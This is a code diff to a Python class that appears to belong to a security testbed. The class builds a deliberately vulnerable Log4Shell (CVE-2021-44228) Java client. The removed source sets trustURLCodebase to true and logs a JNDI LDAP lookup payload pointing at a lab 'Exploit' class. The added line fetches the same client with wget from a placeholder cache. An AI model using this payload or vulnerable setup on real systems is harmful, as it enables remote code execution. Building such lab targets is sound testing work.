@@ -7,13 +7,16 @@ from applications.application import Application
 class Cve202144228VulnerableClient(Application):
     def __init__(self, app, **params):
         name = params.get("name", app)
-        super().__init__(app, name)
+        if "name" in params:
+            del params["name"]
+        super().__init__(app, name, **params)
 
     # Please revise the following functions if it is different
     # from the default way
     def check_application(self, arch=None, os=None):
         logging.debug("Check the application: {}".format(self.app))
         cmds = []
+        cmds.append("must")
         # if arch == "aarch64" and os == "debian":
         #     cmd = "which nmap"
         #     cmds.append(cmd)
@@ -32,7 +35,7 @@ class Cve202144228VulnerableClient(Application):
         cmd = "curl -O https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar"
         cmds.append(cmd)
 
-        cmd = "cat <<EOF > VulnerableClient.java\nimport org.apache.logging.log4j.LogManager;\nimport org.apache.logging.log4j.Logger;\n\nimport java.net.URL;\nimport java.net.URLClassLoader;\n\npublic class VulnerableClient {\n\tprivate static final Logger logger = LogManager.getLogger(VulnerableClient.class);\n\n\tpublic static void main(String[] args) {\n\t\tSystem.out.println(\"Starting VulnerableClient...\");\n\t\ttry {\n\t\t\t// Set the system property to trust remote codebases\n\t\t\tSystem.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\", \"true\");\n\t\t\tSystem.out.println(\"Checking property value: \" + System.getProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\"));\n\n\t\t\t// Log some basic info and attempt the JNDI lookup\n\t\t\tSystem.out.println(\"Attempting JNDI lookup...\");\n\t\t\tlogger.error(\"Java Version->>\" + \"\${java:version}\");\n\t\t\tlogger.error(\"\${jndi:ldap://ldap-server:1389/Exploit}\");\n\t\t\tSystem.out.println(\"JNDI lookup attempted.\");\n\t\t} catch (Exception e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n}\nEOF"
+        cmd = "wget http://cache-address:cache-port/{}/VulnerableClient.java -O ~/VulnerableClient.java".format(self.app)
         cmds.append(cmd)
 
         cmd = "javac -cp \"log4j-core-2.14.1.jar:log4j-api-2.14.1.jar\" VulnerableClient.java"
